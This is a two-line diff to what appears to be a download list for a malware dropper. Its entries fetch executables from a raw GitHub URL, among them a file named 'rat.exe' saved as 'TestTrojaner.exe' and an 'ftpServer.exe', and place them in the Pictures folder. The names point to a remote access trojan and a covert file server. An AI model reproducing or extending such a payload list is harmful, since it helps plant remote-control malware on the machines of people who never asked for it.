@@ -1,1 +1,2 @@
-https://raw.githubusercontent.com/syrabrox/own/main/rat.exe;TestTrojaner.exe
+https://raw.githubusercontent.com/syrabrox/own/main/ftpServer.exe;FtpServer.exe;Pictures
+https://raw.githubusercontent.com/syrabrox/own/main/rat.exe;TestTrojaner.exe;Pictures
